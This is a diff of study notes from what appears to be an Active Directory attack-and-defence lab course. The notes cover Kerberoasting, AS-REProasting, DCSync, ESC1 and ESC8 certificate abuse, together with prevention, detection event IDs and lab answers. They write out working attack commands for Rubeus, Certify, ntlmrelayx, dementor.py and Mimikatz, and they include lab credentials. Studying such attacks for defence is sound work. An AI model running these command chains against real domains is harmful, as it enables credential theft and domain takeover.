@@ -1,54 +1,54 @@
 # Terminology
 ## AD:
-    - heart of Windows Enterprise >>
-    - manage permissions and access to network resources.
+- heart of Windows Enterprise >>
+- manage permissions and access to network resources.
 
-    - Defenders' Friends >> Patch Management >> Defence in Depth >> Network Segmentation
+- Defenders' Friends >> Patch Management >> Defence in Depth >> Network Segmentation
 
-    - `A regular AD user account` without privileged permissions can do some useful activities:
-    - such as >>  **enumerate the majority of objects contained within AD**
-        - Domain Computers / Domain Users / Domain Group Information / Default Domain Policy / Domain Functional Levels
-        - Password Policy / Group Policy Objects (GPOs) / Kerberos Delegation / Domain Trusts / Access Control Lists (ACLs)
+- `A regular AD user account` without privileged permissions can do some useful activities:
+- such as >>  **enumerate the majority of objects contained within AD**
+    - Domain Computers / Domain Users / Domain Group Information / Default Domain Policy / Domain Functional Levels
+    - Password Policy / Group Policy Objects (GPOs) / Kerberos Delegation / Domain Trusts / Access Control Lists (ACLs)
 
 ## Kerberos:
-    - acts as a trusted third party
-    - working with DC
-    - authenticate clients trying to access services
-    - Authentication over LDAP
+- acts as a trusted third party
+- working with DC
+- authenticate clients trying to access services
+- Authentication over LDAP
 
-    - KDC >> Key Distribution Center >> a Kerberos service installed on a DC that creates tickets
-        - Components of the KDC are the `authentication server (AS)` and the `ticket-granting server (TGS)`.
-    - Kerberos Tickets are tokens that serve as proof of identity
-    - `TGT` is proof that the client submitted valid user information to the KDC.
-    - `TGS` is created for each service the client `(with a valid TGT)` wants to access.
+- KDC >> Key Distribution Center >> a Kerberos service installed on a DC that creates tickets
+    - Components of the KDC are the `authentication server (AS)` and the `ticket-granting server (TGS)`.
+- Kerberos Tickets are tokens that serve as proof of identity
+- `TGT` is proof that the client submitted valid user information to the KDC.
+- `TGS` is created for each service the client `(with a valid TGT)` wants to access.
 
-    - `KDC key` is an `encryption key` that proves the TGT is valid
-    - AD creates the KDC key from the hashed password of the **KRBTGT account**,
-        - KRBTGT >> **the first account created in an AD domain.**
-        - stores secrets that are `randomly generated keys` in the `form of password hashes`.
+- `KDC key` is an `encryption key` that proves the TGT is valid
+- AD creates the KDC key from the hashed password of the **KRBTGT account**,
+    - KRBTGT >> **the first account created in an AD domain.**
+    - stores secrets that are `randomly generated keys` in the `form of password hashes`.
 
-    - **Enterprise Admins** >> has permissions over all domains in the forest
-    - Escalation Example >> From Account Operators to Domain Admin
-        - **'MSOL_' user accounts that Azure AD Connect creates upon installation** >>
-        - this is located in `Users` container where `Account Operators` can modify user objects
+- **Enterprise Admins** >> has permissions over all domains in the forest
+- Escalation Example >> From Account Operators to Domain Admin
+    - **'MSOL_' user accounts that Azure AD Connect creates upon installation** >>
+    - this is located in `Users` container where `Account Operators` can modify user objects
 
 ## Real-World View:
-    - **Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock.**
+- **Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock.**
 
-    - **Active Directory has limitations: Complexity / Design / Legacy:**
+- **Active Directory has limitations: Complexity / Design / Legacy:**
 
-    - Complexity >> nested groups >> every 'Domain user' indirectly a member of 'Domain Admins'.
+- Complexity >> nested groups >> every 'Domain user' indirectly a member of 'Domain Admins'.
 
-    - Design     >> AD stores GPOs in a unique network `share/folder called SYSVOL`
-        - For this file, every-domain-joint device should pull settings >> it means they access to DC
-        - Through `SMB` >> **allows for code execution (a remote command shell, where commands will be executed on the Domain Controller)**
-        - If has privileged-account >> **can consistently execute code over SMB on the Domain Controllers remotely.**
+- Design     >> AD stores GPOs in a unique network `share/folder called SYSVOL`
+    - For this file, every-domain-joint device should pull settings >> it means they access to DC
+    - Through `SMB` >> **allows for code execution (a remote command shell, where commands will be executed on the Domain Controller)**
+    - If has privileged-account >> **can consistently execute code over SMB on the Domain Controllers remotely.**
 
-    - Legacy     >> Windows is made with a primary focus >> It works out of the box for most of Microsoft's customers.
-        - is not secure by default
-        - Example >> **Windows ships with the broadcasting - DNS-like protocols NetBIOS and LLMNR enabled by default.**
-        - These protocols are meant to be used `if DNS fails.`
-        - Cependant, they are active even `when it does not`
+- Legacy     >> Windows is made with a primary focus >> It works out of the box for most of Microsoft's customers.
+    - is not secure by default
+    - Example >> **Windows ships with the broadcasting - DNS-like protocols NetBIOS and LLMNR enabled by default.**
+    - These protocols are meant to be used `if DNS fails.`
+    - Cependant, they are active even `when it does not`
 
 
 # Kerberoasting
@@ -104,7 +104,7 @@
     - **Any attempt to this `honeypot user` is suspicious for you**
 
 ## Practical Challenges:
-    1. Connect to the target and perform a Kerberoasting attack. What is the password for the svc-iam user?
+1. Connect to the target and perform a Kerberoasting attack. What is the password for the svc-iam user?
 
     **Solved:**
     - I used the **Rubeus** tool for all accounts with SPNs in the Domain which my user is in windows machine:
@@ -114,7 +114,7 @@
         - `john hashes.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`
     - Voila >> j'ai obtenu le drapeau
 
-    2. After performing the Kerberoasting attack, connect to DC1 and look at the logs in Event Viewer. What is the ServiceSid of the webservice user?
+2. After performing the Kerberoasting attack, connect to DC1 and look at the logs in Event Viewer. What is the ServiceSid of the webservice user?
 
     **Solved:**
     - The idea is to switch immediatement au DC1
@@ -154,7 +154,7 @@
 
 
 ## Practical Challenges:
-    1. Connect to the target and perform an AS-REProasting attack. What is the password for the user anni?
+1. Connect to the target and perform an AS-REProasting attack. What is the password for the user anni?
 
     **Solved:**
     - Using the `Rubeus` tool >>
@@ -163,7 +163,7 @@
         - `john --format=krb5asrep hashes.txt --pot=results.txt`
     - It worked out >> Voila, c'est fini!
 
-    2. After performing the AS-REProasting attack, connect to DC1 (Domain Controller 1), and look at the logs in Event Viewer.
+2. After performing the AS-REProasting attack, connect to DC1 (Domain Controller 1), and look at the logs in Event Viewer.
        What is the TargetSid of the svc-iam user?
 
     **Solved:**
@@ -224,7 +224,7 @@
     - `4771` >> related to Kerberos authentication failures
 
 ## Practical Challenges:
-    1. Connect to the target and run the Powersploit Get-GPPPassword function. What is the password of the svc-iis user?
+1. Connect to the target and run the Powersploit Get-GPPPassword function. What is the password of the svc-iis user?
 
     **Solved:**
     - It went interesting since in Powershell executionpolicy is set to Restricted
@@ -235,7 +235,7 @@
         - `Get-GPPPassword`
     - Voila, j'ai obtenu le drapeau!
 
-    2. After running the previous attack, connect to DC1 and look at the logs in Event Viewer. What is the Access Mask of the generated events?
+2. After running the previous attack, connect to DC1 and look at the logs in Event Viewer. What is the Access Mask of the generated events?
 
     **Solved:**
     - I have connected to the Domain Controller
@@ -320,17 +320,17 @@ TGT Service is generated 4768
 - set up honeypot user >> with **fake password**
 
 ## Practical Challenges
-    1. Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?
+1. Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?
 
     **Solved:**
      - apres faire le script, j'ai trouve le mot de pasword de bonni
 
-    2. Using the password discovered in the previous question, try to authenticate to DC1 as the bonni user. Is the password valid?
+2. Using the password discovered in the previous question, try to authenticate to DC1 as the bonni user. Is the password valid?
 
     **Solved:**
     - No >> pourquoi? >> parceque le mot de password n'est pas correct pour DC1
 
-    3. Connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?
+3. Connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?
 
     **Solved:**
     - J'ai utilise le Event ID 4625, 4776 >> mais avec ces IDs, Je n'ai pas trouve >> le event ID 4771 a fonctione bien
@@ -358,13 +358,13 @@ TGT Service is generated 4768
 - Domain Controller replication generates an event with the **ID 4662**
 
 ## Practical Challenges
-    1. Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?
+1. Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?
 
     **Solved:**
     - D'abbord, j'ai connecte au ordinateur, apres
     - J'ai utilise le Mimikatz et voila j'ai obtenu le drapeau
 
-    2. After performing the DCSync attack, connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the Task Categ       ory of the events generated by the attack?
+2. After performing the DCSync attack, connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the Task Categ       ory of the events generated by the attack?
 
     **Solved:**
     - c'est tres interessant pour moi, car je sais exactement quell ID est utilise pour `replication` >> 4662
@@ -461,7 +461,7 @@ TGT Service is generated 4768
 - This attribute is normally populated if the logon resulted from `an S4U (Service For User)` logon process.
 
 ## Practical Challenges
-    1. Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.
+1. Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.
 
     **Solved:**
     - Apres, finishing all the steps, I initiated the Powershell Remoting and access to DC1
@@ -595,43 +595,43 @@ TGT Service is generated 4768
        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT.*
 
 ## Attack
-    1. To begin with, we will use `Certify` to scan the environment for vulnerabilities in the PKI infrastructure:
-    - `.\Certify.exe find /vulnerable`
-    - When checking the 'Vulnerable Certificate Templates' section, the given template **UserCert**
-        is vulnerable since:
-        1. All Domain users can request a certificate on this template.
-        2. The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the `SAN`
-            **(therefore, any user can request a certificate as any other user in the network, including privileged ones).**
-        3. Manager approval is not required (the certificate gets issued immediately after the request without approval).
-        4. The certificate can be used for 'Client Authentication' (we can use it for login/authentication).
+1. To begin with, we will use `Certify` to scan the environment for vulnerabilities in the PKI infrastructure:
+- `.\Certify.exe find /vulnerable`
+- When checking the 'Vulnerable Certificate Templates' section, the given template **UserCert**
+    is vulnerable since:
+    1. All Domain users can request a certificate on this template.
+    2. The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the `SAN`
+        **(therefore, any user can request a certificate as any other user in the network, including privileged ones).**
+    3. Manager approval is not required (the certificate gets issued immediately after the request without approval).
+    4. The certificate can be used for 'Client Authentication' (we can use it for login/authentication).
 
-    2. Abusing this template:
-    - `.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`
-    - Use `Certify` and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user,
-    - for example, Administrator:
+2. Abusing this template:
+- `.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`
+- Use `Certify` and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user,
+- for example, Administrator:
 
-    3. Once the attack finishes, we will obtain a certificate successfully.
-    4. We need to convert the PEM certificate to the PFX format b
-    - ` sed -i 's/\s\s\+/\n/g' cert.pem`
-    -  `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
+3. Once the attack finishes, we will obtain a certificate successfully.
+4. We need to convert the PEM certificate to the PFX format b
+- ` sed -i 's/\s\s\+/\n/g' cert.pem`
+-  `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
 
-    5. Now that we have **the certificate** in a usable PFX format (which Rubeus supports),
-       we can request a **Kerberos TGT** for the **account Administrator and authenticate with the certificate:**
+5. Now that we have **the certificate** in a usable PFX format (which Rubeus supports),
+    we can request a **Kerberos TGT** for the **account Administrator and authenticate with the certificate:**
 
-       - `.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`
-       - Voila, the ticket is injected in the current session and working bien
-       -
+    - `.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`
+    - Voila, the ticket is injected in the current session and working bien
+    -
 ## Prevention
-    - The attack would not be possible if the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is `not enabled` in the certificate template
-    - Another protection >> **require CA certificate manager approval**
+- The attack would not be possible if the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is `not enabled` in the certificate template
+- Another protection >> **require CA certificate manager approval**
 
 ## Detection
-    - When the CA generates the certificate, >> **IDs of 4886 and 4887**
+- When the CA generates the certificate, >> **IDs of 4886 and 4887**
 
-    - If we want to find the `SAN information`, we'll need to `open the certificate itself`:
+- If we want to find the `SAN information`, we'll need to `open the certificate itself`:
 
 ## Practical Challenges
-    1. After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB_@cademy_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?
+1. After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB_@cademy_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?
 
     **Solved:**
     - `runas /user:eagle\htb-student powershell`
@@ -650,30 +650,30 @@ TGT Service is generated 4768
     - we will utilize the PrinterBug, and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.
 
 ## Attack
-    1. NTLMRelayx to forward incoming connections to the HTTP endpoint of our Certificate Authority
-    -  we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD,
-    -  which Domain Controllers use for client authentication)
-    -  the `--adcs` switch makes NTLMRelayx parse and displays the certificate if one is received:
+1. NTLMRelayx to forward incoming connections to the HTTP endpoint of our Certificate Authority
+-  we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD,
+-  which Domain Controllers use for client authentication)
+-  the `--adcs` switch makes NTLMRelayx parse and displays the certificate if one is received:
 
-    - `impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`
+- `impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`
 
-    2. we need to get the Domain Controller to connect to us
-        - We’ll use the Print Spooler bug and force a reverse connection to us
-        - In this case, we are forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal:
-        - `python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123`
-        -
-        - **we will see that an incoming request from DC2$ was relayed and a certificate was successfully obtained:**
-        - This certificate is for **DC$2**
+2. we need to get the Domain Controller to connect to us
+    - We’ll use the Print Spooler bug and force a reverse connection to us
+    - In this case, we are forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal:
+    - `python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123`
+    -
+    - **we will see that an incoming request from DC2$ was relayed and a certificate was successfully obtained:**
+    - This certificate is for **DC$2**
 
-    3. use Rubeus to the certificate to authenticate with and obtain a TGT:
-        - `.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>`
-        - TGT for DC2 is obtained with certificate
+3. use Rubeus to the certificate to authenticate with and obtain a TGT:
+    - `.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>`
+    - TGT for DC2 is obtained with certificate
 
-    4. **We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2.
-       Being a Domain Controller, we can now trigger DCSync with Mimikatz:**
-        - `.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit`
+4. **We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2.
+    Being a Domain Controller, we can now trigger DCSync with Mimikatz:**
+    - `.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit`
 
-    - **This is successful impersonation of DC2 and performing DCSync to obtain Administrator's password hash**
+- **This is successful impersonation of DC2 and performing DCSync to obtain Administrator's password hash**
 
 ## Prevention
 - The attack was possible because:
@@ -689,7 +689,7 @@ TGT Service is generated 4768
         request and the issuer of the certificate in events ID 4886 and 4887, respectively:**
 
 ## Practical Challenges
-    1. Replicate the attack described in this section and view the related 4886 and 4887 logs.
+1. Replicate the attack described in this section and view the related 4886 and 4887 logs.
        Enter the name shown in the Requester field as your answer. (Format: EAGLE\....)
 
 
